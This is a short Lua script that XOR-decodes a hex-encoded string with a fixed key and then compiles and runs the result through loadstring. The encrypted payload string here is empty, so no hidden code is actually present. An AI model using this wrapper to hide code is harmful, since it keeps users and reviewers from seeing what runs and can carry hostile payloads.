local k={180,124,230,5,227,73,102,119,156,172,60,41,250,113,182,202,111,35,234,80,201,5,4,40,28,75,115,153,154,58,168,160}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
